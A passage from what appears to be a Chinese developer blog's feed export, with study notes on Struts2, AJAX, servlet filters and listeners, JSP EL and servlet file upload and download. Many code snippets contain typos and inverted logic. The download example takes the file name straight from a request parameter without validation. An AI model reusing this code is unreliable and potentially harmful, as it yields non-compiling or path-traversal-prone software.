name="contentDisposition"&gt;attachment;filename=${filename}&lt;/param&gt;&lt;param name="bufferSize"&gt;5*1024&lt;/param&gt;&lt;!--5K 缓冲区，默认 1024--&gt;&lt;param name="contentType"&gt;text/pl..&lt;/param&gt;&lt;/result&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">class DownloadAction{private String filename;//下载文件名private InputStream is;//用来接收下载的文件内容set...getFilename() {return urlencoder.encode(filename, "utf-8");}public String execute() {filename="1.png";//根据逻辑路径“download”获取实际发布到服务器上的文件物理路径String realPath = ServletActionContext.getServletContext().getRealPath("/download");String downPath = realPath + "/" + filename;//将要下载的文件内容 转换为 byte by byteis = new FileInputStream(new File(downPath));return "success";}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有保存的下载（如验证码）：</p><pre class="line-numbers language-XML" data-language="XML"><code class="language-XML">&lt;result type="stream"&gt;inputName&gt;inputStreambufferSize&gt;5*1024&lt;/result&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-JAVA" data-language="JAVA"><code class="language-JAVA">Map&lt;string, bufferedImage&gt; map = ImageUtil.getImage();String code = map.keySet().iterator().next();BufferedImage img = map.get(code);//将 image 对象 转换成 InputStream 格式 发送给浏览器ByteArrayoutputStream baos = new ByteArrayOutputStream(inputStream);JPEGCodec jp = JPEGCodec.createJPEGEncoder(baos);jp.encode(image);//转化流inputStream = new ByteArrayInputStream(baos.toByteArray());return SUCCESS;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="json"><a href="#json" class="headerlink" title="json"></a>json</h3><p>服务器发送给浏览器的是 json 数据</p><ul><li><strong>需要引入 struts-json-plugin.jar（中间件）</strong></li><li><strong>需要改配置文件继承 json-default</strong></li></ul><result type="json" class="org.apache.struts2.json.JSONResult">1.如果这里什么都不写，会将 action 中所有的属性，转换成 json 格式 发送给浏览器2.通过 incluDEProperties 将制定的属性以 json 格式发送给浏览器3.如果返回的是 list，则需要加上.*    <param name="includeProperties">flag,sfdf<!--要返回的数据--></result><h3 id="jfreechart-、highchart"><a href="#jfreechart-、highchart" class="headerlink" title="jfreechart 、highchart"></a>jfreechart 、highchart</h3><p>图表响应，需要导入 jfreechart 或 highchart 包</p><blockquote><p>工厂设计模式<br>(20 多种涉及模式)</p></blockquote><h3 id="chain"><a href="#chain" class="headerlink" title="chain"></a>chain</h3><p>转发到 Action</p><h3 id="redirect"><a href="#redirect" class="headerlink" title="redirect"></a>redirect</h3><p>重定向到 jsp 页面</p><blockquote><p>jsp 无法渠道 action 属性的值</p></blockquote><h3 id="redirectAction"><a href="#redirectAction" class="headerlink" title="redirectAction"></a>redirectAction</h3><p>重定向到另外一个 Action 类</p><h3 id="chain-与-redirectAction-区别"><a href="#chain-与-redirectAction-区别" class="headerlink" title="chain 与 redirectAction 区别"></a>chain 与 redirectAction 区别</h3><ul><li>chain 两个 Action 可以共享值</li><li>redirectAction 两个 Action 无法共享值</li></ul><p>示例：</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">private String name;setName()getNamepublic String excute() {sysout( "action1 name" + name);return SUCCESS;}private String name;setName()getNamepublic String excute() {sysout( "action2 name" + name);return SUCCESS;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>chain01.jsp:</p><pre class="line-numbers language-JSP" data-language="JSP"><code class="language-JSP">form action chain01.actionname="name"submit/form<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>struts.xml:</p><pre class="line-numbers language-XML" data-language="XML"><code class="language-XML">action name= chain01result type = chainchain02action name=chain02result type dispatcherindex.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问 chain01.jsp<br>action01 获取值<br>chain 转发到 action02<br>action02 也能获取 chain01.jsp 提交的值</p><p>若使用 重定向 则 action02 拿不到 chain01.jsp 提交的值</p><blockquote><p>跨包调用 action</p></blockquote><pre class="line-numbers language-XML" data-language="XML"><code class="language-XML">&lt;result&gt;&lt;param name="namespace"&gt;/aaa&lt;/param&gt;&lt;param name="actionName"&gt;/chain02&lt;/param&gt;&lt;/result&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>Two to two,too two to two.Two two,too two to two,too1. 决定是否可以访问 action 对象<br>将 action 的共同逻辑编写在拦截器中</p><h2 id="拦截器-Interceptor"><a href="#拦截器-Interceptor" class="headerlink" title="拦截器 Interceptor"></a>拦截器 Interceptor</h2><p>拦截 action 对象，其你去过来不立即走 action 二十先走 拦截器</p><ol><li>决定是否可以访问 action 对象</li><li>将 action 的共同逻辑编写在拦截器中</li><li></li></ol><h3 id="自定义拦截器"><a href="#自定义拦截器" class="headerlink" title="自定义拦截器"></a>自定义拦截器</h3><ol><li><p>定义拦截器，实现 Interceptor 或 继承 MethodFilterInterceptor 或 AbstractInterceptor</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">//public  class TimeInterceptor implements Interceptor {//public class TimeInterceptor extends MethodFilterInterceptor {public  class TimeInterceptor extends AbstractInterceptor {//ActionInvocation 是 action 对象的执行者@Overridepublic String interept(ActionInvocation invocation) thorws ... {long start = System.currentTimeMillis();String result = invocation.invoke();//调用后续的拦截器或者 action 对象long end = System.currentTimeMillis();long time = end - start;String className = invocation.getAction().getClass().getSimpleName();//代理模式String methodName = invocation.getProxy().getMethod();String msg = "在" + className + "类的" + methodName + "方法上花费了" + tiom "毫秒"；log.info(msg);FileWriter fw = new FileWriter(new File("D:\\2a.txt"), true);fw.write(msg)return result;}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在 struts.xml 中声明拦截器（多个包则每个包都需要声明）</p><pre class="line-numbers language-XML" data-language="XML"><code class="language-XML">&lt;package&gt;&lt;interceptor name="timeInterceptor" class="..."&gt;&lt;/interceptor&gt;&lt;!--1. 如果一个没有配置任何的拦截器 struts 会默认提供一个 defaultStack （默认拦截器栈）2. 一旦配置了一个拦截器，则不再提供 defaultStack 拦截器3. defaultStack 是个很重要的拦截器，所以若手动配置了其他拦截器一定要加上这个默认拦截器--&gt;&lt;interceptor name="defaultStack"&gt;&lt;/interceptor&gt;&lt;!--若配置了 default 则所有 action 都会用默认的拦截器，action 中不再需要配置--&gt;&lt;default-interceptor-ref name="timeInterceptor"&gt;&lt;/default-interceptor-ref&gt;&lt;action ...&gt;&lt;interceptor-ref name="timeInterceptor"&gt;&lt;/interceptor-ref&gt;...&lt;/action&gt;&lt;/package&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>如果一个没有配置任何的拦截器 struts 会默认提供一个 defaultStack （默认拦截器栈）</p></li><li><p>一旦配置了一个拦截器，则不再提供 defaultStack 拦截器</p></li><li><p>defaultStack 是个很重要的拦截器，所以若手动配置了其他拦截器一定要加上这个默认拦截器</p></li></ol><p>定义拦截器栈<br>参考 defaultStack</p><br>### 内置拦截器fileUpload 上传拦截器<pre class="line-numbers language-XML" data-language="XML"><code class="language-XML">&lt;interceptor-ref name="fileUpload"&gt;&lt;param name="maximumSize"&gt;1024&lt;/param&gt;&lt;!-- 最大大小（字节） --&gt;&lt;param name="allowedTypes"&gt;image/jpeg, image/png,image/gif&lt;/param&gt;&lt;!-- 允许类型 --&gt;&lt;!-- &lt;param name="allowedExtensions"&gt;.jpg, .png,.gif&lt;/param&gt;允许的后缀类型 --&gt;&lt;/interceptor-ref&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>token/tokenSession:组织表单重复提交</p><h3 id="国际化"><a href="#国际化" class="headerlink" title="国际化"></a>国际化</h3><p>图片服务器分离技术</p><p>虚拟目录</p><h2 id="ognl-表达式"><a href="#ognl-表达式" class="headerlink" title="ognl 表达式"></a>ognl 表达式</h2><p>对象图导航语言，提供一个对象，获取这个对象属性值，或者对属性参与加工。</p><ul><li>表达式没有 # 号，就去 root 区查找对应的值</li><li>表达式有 # 号，就去 context 区查找对应的值</li></ul><p>ognl 表达式要结合 struts 标签使用</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 框架 </tag>
            
            <tag> struts2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BankPatrol 项目感悟</title>
      <link href="/2017/05/13/bankpatrol-xiang-mu-gan-wu/"/>
      <url>/2017/05/13/bankpatrol-xiang-mu-gan-wu/</url>
      
        <content type="html"><![CDATA[<p>最近几天和朋友两人模拟做了个<a href="https://github.com/CrazyBunQnQ/BankPatrol">银行巡检</a>的项目，由于时间紧促，我们只做了部分功能。<br>为了能让自己更快的成长，我们是把它当做一个真正的项目来做的。<br>在该项目中，我们用到了 JUnit 测试类和 Git 版本管理工具。</p><span id="more"></span><h2 id="主要收获："><a href="#主要收获：" class="headerlink" title="主要收获："></a>主要收获：</h2><h3 id="学会了使用-Git-进行团队合作"><a href="#学会了使用-Git-进行团队合作" class="headerlink" title="学会了使用 Git 进行团队合作"></a>学会了使用 Git 进行团队合作</h3><p>在该项目中，我们没有选择 SVN 而选择了全球最流行的 Git 版本管理工具。</p><p>将每一次对项目的修改都提交到 Git 版本管理中，方便查看每个成员做了哪些内容以及每次更改都修改了哪些东西（具体到行）。</p><p>虽然平时自己写的代码都是使用 Git 进行版本管理，但是从来没有使用 Git 进行过团队合作，所以这是第一次使用 Git 来进行团队合作，因此学会了 Git 版本管理协同合作的方法：</p><ul><li>如何项目创建者那里获取项目</li><li>如何将自己的代码提交到项目拥有者</li><li>如何解决多个用户修改统一处代码的冲突</li><li>项目创建者如何查看、合并及拒绝团队其他成员提交的代码</li></ul><p>这也是我目前在这个项目中最大的收获之一。为以后在开源社区做贡献做了铺垫。</p><br>### 遇到并通过查阅资料解决了很多问题在该项目中，我遇到了很多以前从未遇到过的问题与 bug。而这些问题都是由我自己查阅资料和文档解决的，这是我再该项目中另一个最大的收获。<br>## 遗憾：<h3 id="Git-只使用了一个分支"><a href="#Git-只使用了一个分支" class="headerlink" title="Git 只使用了一个分支"></a>Git 只使用了一个分支</h3><p>该项目初次尝试 Git 团队合作，没有严格按照 Git 版本管理流程创建分支，只有一个主分支。<br>而正规的流程应该至少分为三个分支：</p><ul><li>master 主分支：线上的可运行版本。</li><li>dev 开发分支：新功能、新模块应在此分支上进行开发。开发完成后再将新功能合并到主分支上。</li><li>fix 补丁分支：线上程序出现的 bug 应在此分支上进行修复，修复后将代码合并到主分支上。</li></ul><p>这是我比较遗憾的一点，但是在以后的项目中，我将会按照这个流程来进行开发。</p><br>### 没有记录下遇到的成堆问题 (ToT)啊！这个是最大的遗憾，因为时间紧促，没有将遇到的问题记录到我的 [**Issues 集锦**](http://crazybunqnq.com/2017/03/15/Issues/) 中。 <p>以后遇到再说吧，朋友们若遇到什么问题也可以在我的 <a href="http://crazybunqnq.com/2017/03/15/Issues/">Issues 集锦</a> 里留言，帮我提升解决问题的能力。</p>]]></content>
      
      
      <categories>
          
          <category> Web 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web 搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作 Excel 表格（jxl）</title>
      <link href="/2017/05/11/jxl-cao-zuo-excel-biao-ge/"/>
      <url>/2017/05/11/jxl-cao-zuo-excel-biao-ge/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">//创建 WorkBook 对象 Excel 文件WritableWorkbook workBook = Workbook.createWrokbook(new File("..."));//创建工作表WritableSheet sheet = workBook.createSheet("aaa");//新创建一个名为 aaa 的工作表WritableSheet sheet = workBook.createSheet("aaa",0);//为第一个工作表命名为 aaa//向第 1 列第 2 行（就是坐标）添加数据sheet.addCell(new Lable(0, 1, "序号"));//在(0,1)坐标的格子添加“序号”sheet.addCell(new Lable(1, 1, "姓名"));//在(1,1)坐标的格子添加“姓名”//将数据写入到 Excel 表格中workBook.write();//关闭workBook.close();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Excel </tag>
            
            <tag> jxl </tag>
            
            <tag> 表格 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AJAX</title>
      <link href="/2017/05/02/ajax/"/>
      <url>/2017/05/02/ajax/</url>
      
        <content type="html"><![CDATA[<p>AJAX (asyn javascript and xml，异步 JavaScript 和 XML)</p><span id="more"></span><ul><li><p>同步的：<br>发出请求 → 页面销毁，等待服务请求 → 处理请求 → 返回新页面（新页面）<br>这样会导致表单提交后如果失败会清空用户输入的数据，导致用户体验很差</p></li><li><p>异步的：<br>向服务器发出请求和用户的操作是异步的，各做各的，不需要等待，页面只会局部刷新，不会整个刷新。<br>每输入一个内容，都会发送请求，你输入你的，服务器处理它的数据。</p></li></ul><p>优势：</p><ul><li>用户体验好（页面不会被销毁，按需及时获取数据）</li><li>按需获取数据</li></ul><h2 id="异步编程"><a href="#异步编程" class="headerlink" title="异步编程"></a>异步编程</h2><ol><li>获取浏览器内置的 BOM 对象 XmlHttpRequest</li><li>和服务器建立连接</li><li>发送请求</li><li>页面上做 JS 处理</li></ol><p>实例：验证用户名是否重复</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">//获取不同浏览器内置对象 XMLHttpRequestfunction getXhr() {var xhr = null;if (window.XMLHttpRequest) {// 大多数浏览器获取内置对象 XMLHttpRequest 的方法xhr = new XMLHttpRequest;} else {// IE 浏览器获取内置对象 XMLHttpRequestxhr = new ActiveXObject("Microsoft.XMLHttp");}return xhr;}// 异步发送请求function checkUname() {//1.获取浏览器内置对象 XMLHttpRequestvar xhr = getXhr();//获取用户输入的用户名var username = document.getElementById("uname").value;//2.和服务器建立连接xhr.open("get","checkuname?uname=" + username,true);//3.获取到服务器返回的数据 页面处理xhr.onreadystatechange = function () {//回调函数 callback（服务器返回数据后才会执行，而不是立即执行，根据服务器返回的状态码进行相应处理）//判断服务器响应状态if (xhr.readyState === 4 &amp;&amp; xhr.state === 200) {//获取服务器返回的数据内容var txt = xhr.responseText;document.getElementById("msg").innerHTML = txt==0?"用户名已被使用":"";}};//4.发送异步请求xhr.send(null);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若要改为 post 请求</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">xhr.open("post","checkuname" + username,true);xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");xhr.send("uname=" + username);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>服务器响应的五个状态值</p></blockquote><ul><li>0：(未初始化)对象已经建立</li><li>1：(初始化)对象已经建立，尚未调用 send 方法 </li><li>2：(发送数据)异步请求刚发送出去  send 方法已经调用</li><li>3：(数据发送中)服务器将数据部分响应给浏览器   已经接受部分数据，此时，数据不完全发送完毕</li><li>4：服务器将数据全部响应给浏览器 响应结束，此时可以通过 responseText/respo 获取数据了</li></ul><p>get 和 post 的区别：</p><ul><li><p>open(“get”, “地址?参数名=参数值”, true);</p></li><li><p>open(“post”, “地址”, true);<br>send(“参数名=参数值&amp;参数名=参数值”);</p></li></ul><blockquote><p>open() 方法第三个参数：<br>false：就是等待有返回数据的时候再继续往下走，还没有得到数据的时候就会卡在那里，直到获取数据为止。<br>true：就是不等待,直接返回，这就是所谓的异步获取数据！</p></blockquote><h2 id="解析-JSON-数据"><a href="#解析-JSON-数据" class="headerlink" title="解析 JSON 数据"></a>解析 JSON 数据</h2><p>json 数据格式：<br>{“id”:101,”name”:”张三丰”}</p><p>//获取到<br>var txt = xhr.responseText;<br>//将 JSON 字符串解析为 DOM 对象<br>var obj = JSON.parse(str);<br>//或<br>var arr = txt.evalJson();</p><p>document.getElementByID(“tb”).innerHTML = “”;<br>var tr = document.createElemennt(“tr”);//创建标签<br>var td1 = document.createElemennt(“td”);//创建标签<br>var td2 = document.createElemennt(“td”);//创建标签<br>var td3 = document.createElemennt(“td”);//创建标签<br>td1.innerHTML = obj.stock_no;<br>td2.innerHTML = obj.stock-name;<br>td3.innerHTML = obj.stock_price;<br>tr.appendChild(td1);<br>tr.appendChild(td2);<br>tr.appendChild(td3);<br>document.getElementByID(“tb”).appendChild(tr);</p><blockquote><p>prototype 1.6.js 框架<br>封装了很多 js 函数</p></blockquote><h2 id="JQuery"><a href="#JQuery" class="headerlink" title="JQuery:"></a>JQuery:</h2><p>js 框架 封装了原始 js 代码<br>封装了 js 的操作<br>功能<br>开发效率快 准确度高<br>屏蔽所有浏览器的差异，兼容性好<br>jquery 对象  （dom 对象封装后成了 jquery 对象）<br>dom 对象</p><ol><li><a href="http://www.w3school.com.cn/jquery/jquery_ref_selectors.asp">jquery 选择器</a></li></ol><blockquote><p>类似于 css 选择器<br>选择性查找对象</p></blockquote><hr><blockquote><p>html()：支持 html 标记，会渲染为对应的效果<br>text()：不支持 html 标记</p></blockquote><h3 id="jquery-操作-DOM"><a href="#jquery-操作-DOM" class="headerlink" title="jquery 操作 DOM"></a>jquery 操作 DOM</h3>]]></content>
      
      
      <categories>
          
          <category> Web 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AJAX </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>过滤器和监听器</title>
      <link href="/2017/05/02/filter/"/>
      <url>/2017/05/02/filter/</url>
      
        <content type="html"><![CDATA[<p>Filter 可以将 Servlet 中共同的、通用的的代码，抽取出来，形成一个过滤器，然后将这个过滤器配置在需要<br>改善软件结构。</p><p>将 Servlet 上公共的逻辑代码写在过滤器中，通过配置 web.xml 的形式作用到 Servlet 上；<br>还可以根据 url 请求决定是否访问 servlet 对象。</p><span id="more"></span><h2 id="Filter-过滤器"><a href="#Filter-过滤器" class="headerlink" title="Filter 过滤器"></a>Filter 过滤器</h2><h3 id="Filter-配置与实现方法"><a href="#Filter-配置与实现方法" class="headerlink" title="Filter 配置与实现方法"></a>Filter 配置与实现方法</h3><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">//过滤的逻辑写在这里//FilterChin:过滤器链public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException {HttpServletRequest request = (HttpServletRequest)req;HttpServletResponse response = (HttpServletResponse)res;if (!charEncoding.equals(request.getCharacterEncoding())) {request.setCharacterEncoding(charEncoding);}response.setCharacterEncoding("text/html;charset=" + charEncoding);chain.doFilter(request, response);//调用后续的过滤器或者 Servletchain.doFilter(request, response);}//获取配置中设置的过滤器参数public void init(FilterConfig fConfig) {charEncoding = fConfig.getInitParameter("encoding");if (charEncoding == null) {LOGGER.warn("EncodingFilter 中的编码设置为空！！！设置为默认编码：utf-8");charEncoding = "utf-8";}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>web.xml 配置过滤器</p><pre class="line-numbers language-XML" data-language="XML"><code class="language-XML">&lt;filter&gt;&lt;filter-name&gt;EncodingFilter&lt;/filter-name&gt;&lt;filter-class&gt;com.crazybunqnq.filter.EncodingFilter&lt;/filter-class&gt;&lt;!--配置过滤器参数--&gt;&lt;init-param&gt;&lt;param-name&gt;encoding&lt;/param-name&gt;&lt;param-value&gt;utf-8&lt;/param-value&gt;&lt;/init-param&gt;&lt;/filter&gt;&lt;filter-mapping&gt;&lt;filter-name&gt;EncodingFilter&lt;/filter-name&gt;&lt;!--配置过滤的路径，可以是页面路径也可以是 Servlet 路径--&gt;&lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意！<br>过滤器之间按从上到下的顺序依次过滤;<br>过滤器要放在 Servlet 配置之前。</p></blockquote><h3 id="过滤器的特点："><a href="#过滤器的特点：" class="headerlink" title="过滤器的特点："></a>过滤器的特点：</h3><ul><li>依赖容器（Tomcat 等服务器）；</li><li>底层通过反射实现的。</li></ul><p>过滤器的作用：</p><ul><li>简化重复逻辑代码；</li><li>容易维护；</li><li>代码简洁；</li><li>结构灵活；</li></ul><h2 id="Listener-监听器"><a href="#Listener-监听器" class="headerlink" title="Listener 监听器"></a>Listener 监听器</h2><p>Listener 监听某一个动作发生，一旦发生，需要做一些处理。</p><p>Listener 有两大类型：</p><ol><li>监听 request session 等对象的创建或者销毁</li><li>监听对象的事数据绑定：<br>request.setAttribute(“key”,value);<br>session.setAttribute(“key”,value);</li></ol><h3 id="监听-request、session-等对象的创建或者销毁"><a href="#监听-request、session-等对象的创建或者销毁" class="headerlink" title="监听 request、session 等对象的创建或者销毁"></a>监听 request、session 等对象的创建或者销毁</h3><p>实例：监听当前服务器的访问人数。<br>思路：监听 session 对象的创建和销毁方法：</p><ul><li>sessionCreate();</li><li>sessionDestory();</li></ul><p>监听器代码：</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public class CountLisenter implements HttpSessionListener{/*** 访问人数*/private long count = 0;//session 被创建时执行public void sessionCreated(HttpSessionEvent arg0) {count++;updateCount(arg0);}//session 被销毁时执行public void sessionDestroyed(HttpSessionEvent arg0) {count--;updateCount(arg0);}/*** 将 count 存入 application 对象*/private void updateCount(HttpSessionEvent event) {//获取 application 对象ServletContext application = event.getSession().getServletContext();//将当前服务器访问人数绑定到 对象上，再从 jsp 页面获取application.setAttribute("count", count);}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>监听 session： HttpSessionListener<br>监听 request： ServletRequestListener<br>监听 application： ServletContextListener<br>等等，举一反三</p></blockquote><p>配置 监听器（在过滤器之前）</p><pre class="line-numbers language-XML" data-language="XML"><code class="language-XML">&lt;listener&gt;&lt;listener-class&gt;com.crazybunqnq.listener.CountLisenter&lt;/listener-class&gt;&lt;/listener&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在 jsp 中通过 <code>${applicationScope.count}</code> 或 <code>${count}</code> 取出 count 值。</p><p>若想设置关闭浏览器的时候销毁 Session 对象，可以在 jsp 页面中设置 onbeforeunload=”” 事件<br>onbeforeunload=””</p><h3 id="监听器的特点："><a href="#监听器的特点：" class="headerlink" title="监听器的特点："></a>监听器的特点：</h3><ul><li>符合某个动作后，自动调用执行监听器的方法。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Filter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSP 之 EL 表达式</title>
      <link href="/2017/04/28/jsp-el/"/>
      <url>/2017/04/28/jsp-el/</url>
      
        <content type="html"><![CDATA[<p><strong>EL 简介：</strong></p><ul><li>EL (Expression Language) 是 JSP 内置的表达式语言，用于访问页面的上下文以及不同作用域的对象，取得对象属性的值，或执行简单的有运算或判断操作，EL 在得到某个数据时，会自动进行数据类型的转换。</li><li>EL 表达式用于代替 JSP 表达式(&lt;%=%&gt;) 在页面中做输出操作。</li></ul><span id="more"></span><pre class="line-numbers language-JSP" data-language="JSP"><code class="language-JSP">${变量}${对象.属性}${requestScope.requestName}${sessionScope.requestName}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>等同于</p><pre class="line-numbers language-JSP" data-language="JSP"><code class="language-JSP">&lt;%= 变量 %&gt;&lt;%= 对象.属性 %&gt;&lt;%= requestScope.requestName %&gt;&lt;%= sessionScope.requestName %&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>EL 表达式仅仅用来读取数据，而不能对数据进行修改。</li><li>使用 EL 表达式输出数据时，如果有则输出数据，如果为 null 则什么也不输出。</li></ul><br>## EL 基本用法：- EL 表达式总是放在 {} 中，而且前边有一个 $ 作为前缀。- 获取域中<br>## 页面上下文 (pageContext)pageContext 的作用域是当前页面pageContext.setAttribute("","");String  a = (String)pageContext.getAttribute("name","a");String  b = (String)pageContext.getAttribute("name","b");使用 pageContext 检索域String c = pageContext.findAttribute("name");//会得到最近的 c = b<p>pageContext：当前页面<br>request：一次请求中<br>session：一次会话中<br>application：服务器声明周期<br>作用范围依次递增<br>findAttribute 方法会检索四个域，检索的顺序是</p><ol><li>pageContext</li><li>request</li><li>session</li><li>application</li></ol>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待完善 </tag>
            
            <tag> JSP </tag>
            
            <tag> EL 表达式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Servlet 文件上传和下载</title>
      <link href="/2017/04/26/servlet-upload-and-download/"/>
      <url>/2017/04/26/servlet-upload-and-download/</url>
      
        <content type="html"><![CDATA[<p>Servlet 实现上传和下载的依赖包：</p><ul><li>commons-fileupload-x.x.x.jar</li><li>commons-io-x.x.x.jar<blockquote><p>x.x.x 为版本号</p></blockquote></li></ul><span id="more"></span><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>创建表单：在 form 表单中设置 enctype 属性,将表单作为一个字节流数据提交</p><pre class="line-numbers language-HTML" data-language="HTML"><code class="language-HTML">&lt;form action="" method="post" enctype="multipart/form-data"&gt;...&lt;/form&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>创建 Servlet:</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">//1. 获取 FileItemFactory 类FileItemFactory fif = new DiskFileItemFactory();//接口类，需要 new 实现类//2. 获取 ServletFileUpload 类ServletFileUpload sfu = new ServletFileUpload(fif);//3. 解析 request 对象List&lt;FileItem&gt; items = null;try {items = sfu.parseRequest(request);for (FileItem item : items) {//判断 item 是否为普通的文本域if (item.ifFormField()) {//正常处理文本域String fieldName = item.getFieldName();//获取文本域的 name 属性值String fieldValue = item.getString("utf-8");//获取文本域的 value 属性值} else {//否则该 item 是文件//进行文件上传//1. 设置上传文件地址，获取文件夹绝对路径ServletContext app = request.getSession().getServletContext();String realPathapp.getRealPath("/文件夹名");//2. 获取文件名称String fileName = item.getName();System.out.println("文件路径: " + realPath + fileName);//3. 为了避免文件名冲突，添加时间戳或 UUID，这里添加 UUIDint point = fileName.lastIndexOf(".");//获取点的位置String prefix = fileName.substring(0, point);//获取前缀String suffix = fileName.substring(point, fileName.length());//获取后缀System.out.println("前缀: " + prefix + ", 后缀： " + suffix);fileName = prefix + UUID.randomUUID() + suffix;//文件名结尾添加 UUID 唯一标识System.out.println("文件路径: " + realPath + fileName);//4. 上传文件String fileType item.getContentType();//获取上传文件的类型long size = item.getSize();//获取文件大小，单位（字节 B）if (type.indexOf("image") != -1 ) {//判断是否为图片，可File file = new File(realPath + File.separator + fileName);item.write(file);} else if (size &lt;= 1 * 1024 * 1024){request.setAttribute("error","文件大小不能超过 1 M");request.getRequestDispa} else {request.setAttribute("error", "文件格式错误");request.getRequestDispatcher("").forward(request,response);//转发}}}} catch (FileUploadException e) {e.printStackTrace();} catch (Exception e) {e.printStackTrace();}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>## 文件下载<p>HTML 超链接：</p><pre class="line-numbers language-HTML" data-language="HTML"><code class="language-HTML">&lt;a href="&lt;% path %&gt;/download?filename=文件名.后缀名"&gt;下载&lt;/a&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建 Servlet：</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">//获取需要下载的文件绝对路径String fileName = request.getParameter("filename");//设置编码格式，防止乱码fileName = new String(fileName.getBytes("ISO-8859-1","utf-8"));//获取下载文件夹的绝对路径ServletContext app = 